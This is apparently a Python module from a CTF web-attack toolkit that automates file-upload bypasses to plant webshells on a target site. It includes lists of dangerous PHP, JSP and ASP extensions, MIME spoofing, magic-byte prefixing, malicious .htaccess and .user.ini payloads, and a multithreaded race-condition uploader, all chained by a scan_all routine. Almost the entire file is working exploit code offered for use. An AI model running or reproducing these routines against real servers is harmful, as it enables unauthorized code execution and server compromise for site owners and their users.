"""
CTF Web Toolkit - File Upload Bypass Module
支持：MIME 伪造 / 扩展名绕过 / 魔术字节 / .htaccess / 条件竞争 / 二次渲染绕过
"""

import io
import time
import threading
from typing import Optional, List, Dict
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 常见上传字段名 ─────────────────────────────
COMMON_FILE_PARAMS = ["file", "upload", "image", "img", "avatar", "photo",
                      "attachment", "document", "files", "upfile", "userfile"]

# ── 允许上传的白名单扩展（常见配置）──────────────
WHITELIST_EXTS = [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
                  ".pdf", ".txt", ".doc", ".docx", ".zip"]

# ── PHP 危险扩展名 ─────────────────────────────
PHP_EXTS = [
    ".php", ".php3", ".php4", ".php5", ".php7", ".php8",
    ".phtml", ".pht", ".phps", ".phar", ".phpt",
    ".php.jpg",            # 双扩展名
    ".php%00.jpg",         # Null byte
    ".php ",               # 尾部空格
    ".php.",               # 尾部点
    ".php::$DATA",         # Windows NTFS ADS
    ".PHP",                # 大写
    ".Php", ".PHp", ".pHp",
]

# ── JSP/ASP/ASPX 危险扩展名 ───────────────────
JSP_EXTS = [".jsp", ".jspx", ".jspf", ".jsw", ".jsv", ".jtml"]
ASP_EXTS = [".asp", ".asa", ".cer", ".cdx", ".aspx", ".ashx", ".ascx", ".asmx"]

# ── MIME 类型映射 ──────────────────────────────
MIME_TYPES = {
    "php":   "image/jpeg",
    "jsp":   "image/jpeg",
    "asp":   "image/jpeg",
    "image": "image/jpeg",
    "gif":   "image/gif",
    "png":   "image/png",
    "pdf":   "application/pdf",
    "text":  "text/plain",
}

# ── 常见图片魔术字节头 ─────────────────────────
MAGIC_BYTES = {
    "jpg":  b"\xff\xd8\xff\xe0",
    "png":  b"\x89PNG\r\n\x1a\n",
    "gif":  b"GIF89a",
    "bmp":  b"BM",
    "pdf":  b"%PDF-1.4",
    "zip":  b"PK\x03\x04",
}

# ── .htaccess 内容 ─────────────────────────────
HTACCESS_PAYLOADS = [
    # 让 .jpg 被解析为 PHP
    b"AddType application/x-httpd-php .jpg",
    b"AddType application/x-httpd-php .png .jpg .gif",
    # SetHandler 方式
    b"<FilesMatch \\.jpg$>\nSetHandler application/x-httpd-php\n</FilesMatch>",
    # php_value 注入
    b"php_value auto_prepend_file \"/etc/passwd\"",
    b"php_value auto_prepend_file \"/var/www/html/shell.php\"",
    # 解析 .xxx 扩展名为 PHP
    b"AddHandler php5-script .xxx",
    b"AddHandler php7-script .shell",
]

# ── user.ini 内容 ─────────────────────────────
USER_INI_PAYLOADS = [
    b"auto_prepend_file=shell.jpg",
    b"auto_prepend_file=/var/www/html/shell.jpg",
    b"auto_append_file=shell.jpg",
]


class UploadScanner:
    """文件上传漏洞检测与利用"""

    def __init__(self, requester: Requester):
        self.req = requester

    def detect_upload_field(self, url: str) -> List[str]:
        """从页面分析表单，猜测文件上传字段名"""
        section("检测上传字段")
        import re
        resp = self.req.get(url)
        if not resp:
            return []
        found_fields = re.findall(
            r'<input[^>]+type=["\']file["\'][^>]*name=["\']([^"\']+)["\']',
            resp.text, re.IGNORECASE
        )
        found_fields += re.findall(
            r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']file["\']',
            resp.text, re.IGNORECASE
        )
        for f in found_fields:
            ok(f"  发现上传字段: {f}")
        return found_fields

    def try_extensions(self, url: str, file_param: str, shell_code: bytes,
                       exts: Optional[List[str]] = None,
                       extra_data: Optional[Dict] = None,
                       mime: str = "image/jpeg",
                       verify_url: str = "") -> Optional[str]:
        """
        逐一尝试危险扩展名上传 Webshell
        返回成功的扩展名或 None
        """
        section("扩展名绕过上传")
        if exts is None:
            exts = PHP_EXTS

        for ext in exts:
            filename = f"shell{ext}"
            info(f"  尝试: {filename}")
            resp = _upload_file(
                self.req, url, file_param,
                filename=filename,
                content=shell_code,
                mime=mime,
                extra_data=extra_data,
            )
            if resp and _upload_success(resp.text):
                # 尝试获取上传路径
                upload_path = _extract_upload_path(resp.text)
                found("上传成功", f"扩展名={ext!r} 路径={upload_path or '未知'}")
                if verify_url and upload_path:
                    verify_resp = self.req.get(verify_url.rstrip("/") + "/" + upload_path.lstrip("/"))
                    if verify_resp and verify_resp.status_code == 200:
                        ok(f"  Shell 可访问: {verify_url}/{upload_path}")
                return ext
        info("所有扩展名尝试失败")
        return None

    def try_mime_bypass(self, url: str, file_param: str, shell_code: bytes,
                        filename: str = "shell.php",
                        extra_data: Optional[Dict] = None) -> bool:
        """尝试各种 Content-Type 绕过"""
        section("MIME 类型绕过")
        for mime in MIME_TYPES.values():
            info(f"  尝试 MIME: {mime}")
            resp = _upload_file(self.req, url, file_param,
                                filename=filename, content=shell_code,
                                mime=mime, extra_data=extra_data)
            if resp and _upload_success(resp.text):
                found("MIME 绕过", mime)
                return True
        return False

    def try_magic_bytes(self, url: str, file_param: str, shell_code: bytes,
                        filename: str = "shell.php",
                        magic: str = "gif",
                        extra_data: Optional[Dict] = None) -> bool:
        """在文件头部插入图片魔术字节绕过内容检测"""
        section("魔术字节绕过")
        prefix = MAGIC_BYTES.get(magic, b"GIF89a")
        # GIF89a + 换行 + PHP 代码（绕过 getimagesize）
        content = prefix + b"\n" + shell_code
        resp = _upload_file(self.req, url, file_param,
                            filename=filename, content=content,
                            mime=f"image/{magic}", extra_data=extra_data)
        if resp and _upload_success(resp.text):
            found("魔术字节绕过", f"{magic} 头 + PHP 内容")
            return True
        return False

    def upload_htaccess(self, url: str, file_param: str,
                        payload_idx: int = 0,
                        extra_data: Optional[Dict] = None) -> bool:
        """上传恶意 .htaccess 文件"""
        section(".htaccess 上传")
        content = HTACCESS_PAYLOADS[payload_idx % len(HTACCESS_PAYLOADS)]
        for filename in [".htaccess", "htaccess.txt"]:
            resp = _upload_file(self.req, url, file_param,
                                filename=filename, content=content,
                                mime="text/plain", extra_data=extra_data)
            if resp and _upload_success(resp.text):
                found(".htaccess 上传成功", f"payload={content[:50]!r}")
                return True
        return False

    def upload_user_ini(self, url: str, file_param: str,
                        shell_filename: str = "shell.jpg",
                        extra_data: Optional[Dict] = None) -> bool:
        """上传 .user.ini 文件（PHP 5.3+ 非 CGI 模式）"""
        section(".user.ini 上传")
        content = f"auto_prepend_file={shell_filename}\n".encode()
        resp = _upload_file(self.req, url, file_param,
                            filename=".user.ini", content=content,
                            mime="text/plain", extra_data=extra_data)
        if resp and _upload_success(resp.text):
            found(".user.ini 上传成功", content.decode().strip())
            return True
        return False

    def race_condition(self, url: str, file_param: str, shell_code: bytes,
                       filename: str = "shell.php", shell_url: str = "",
                       threads: int = 20, duration: int = 10,
                       extra_data: Optional[Dict] = None) -> bool:
        """
        条件竞争上传：
        一边高并发上传 → 一边高并发访问，在删除前触发执行
        每个线程独立 Session，避免线程安全问题
        """
        section("条件竞争上传")
        warn(f"  并发线程: {threads}  持续: {duration}s")
        warn(f"  Shell URL: {shell_url}")

        # 预先捕获会话配置，供各线程独立创建 Requester
        _proxies = dict(self.req.session.proxies) if self.req.session.proxies else {}
        _cookies = dict(self.req.session.cookies)
        _headers = {k: v for k, v in self.req.session.headers.items()
                    if k.lower() not in ("user-agent", "accept", "accept-language", "connection")}
        _timeout = self.req.timeout
        _verify = self.req.verify_ssl

        hit = threading.Event()
        _tls = threading.local()

        def _thread_req() -> Requester:
            """每个线程首次调用时创建独立的 Requester"""
            if not hasattr(_tls, "req"):
                proxy = list(_proxies.values())[0] if _proxies else None
                _tls.req = Requester(proxy=proxy, cookies=_cookies,
                                     headers=_headers, timeout=_timeout,
                                     verify_ssl=_verify)
            return _tls.req

        def upload_loop():
            req = _thread_req()
            while not hit.is_set():
                _upload_file(req, url, file_param,
                             filename=filename, content=shell_code,
                             mime="image/jpeg", extra_data=extra_data)

        def access_loop():
            req = _thread_req()
            while not hit.is_set():
                if shell_url:
                    resp = req.get(shell_url)
                    if resp and resp.status_code == 200 and len(resp.text) > 5:
                        found("条件竞争成功", shell_url)
                        hit.set()

        workers = []
        for _ in range(threads // 2):
            workers.append(threading.Thread(target=upload_loop, daemon=True))
            workers.append(threading.Thread(target=access_loop, daemon=True))
        for w in workers:
            w.start()

        time.sleep(duration)
        hit.set()
        return hit.is_set()

    def scan_all(self, url: str, file_param: str, shell_code: bytes,
                 extra_data: Optional[Dict] = None) -> dict:
        """全自动上传绕过扫描"""
        section("全自动上传绕过扫描")
        result = {}

        ok("测试 1/4: 扩展名绕过")
        ext = self.try_extensions(url, file_param, shell_code,
                                  extra_data=extra_data)
        if ext:
            result["ext_bypass"] = ext

        ok("测试 2/4: MIME 绕过")
        if self.try_mime_bypass(url, file_param, shell_code,
                                extra_data=extra_data):
            result["mime_bypass"] = True

        ok("测试 3/4: 魔术字节")
        if self.try_magic_bytes(url, file_param, shell_code,
                                extra_data=extra_data):
            result["magic_bypass"] = True

        ok("测试 4/4: .htaccess")
        if self.upload_htaccess(url, file_param, extra_data=extra_data):
            result["htaccess"] = True

        return result


# ── 内部辅助 ──────────────────────────────────
def _upload_file(req: Requester, url: str, file_param: str,
                 filename: str, content: bytes, mime: str,
                 extra_data: Optional[Dict] = None):
    """构造 multipart/form-data 上传请求"""
    try:
        files = {file_param: (filename, io.BytesIO(content), mime)}
        data = extra_data or {}
        return req.post(url, files=files, data=data)
    except Exception as e:
        err(f"上传请求失败: {e}")
        return None


def _upload_success(text: str) -> bool:
    """判断上传是否成功（通用特征）"""
    success_keywords = [
        "success", "uploaded", "上传成功", "上传完成",
        "/upload/", "/uploads/", "file saved", "保存成功",
    ]
    fail_keywords = [
        "not allowed", "invalid", "failed", "denied",
        "不允许", "非法", "失败", "禁止",
        "extension", "file type", "only", "格式",
    ]
    text_lower = text.lower()
    has_success = any(k.lower() in text_lower for k in success_keywords)
    has_fail = any(k.lower() in text_lower for k in fail_keywords)
    return has_success and not has_fail


def _extract_upload_path(text: str) -> Optional[str]:
    """从响应中提取上传文件路径"""
    import re
    # JSON 路径
    match = re.search(r'"(?:url|path|file|src)"\s*:\s*"([^"]+)"', text)
    if match:
        return match.group(1)
    # HTML src/href
    match = re.search(r'(?:src|href)=["\']([^"\']*(?:upload|file)[^"\']*)["\']',
                      text, re.IGNORECASE)
    if match:
        return match.group(1)
    # 路径格式
    match = re.search(r'(?:/upload[s]?/[^\s<>"\']+)', text)
    if match:
        return match.group()
    return None
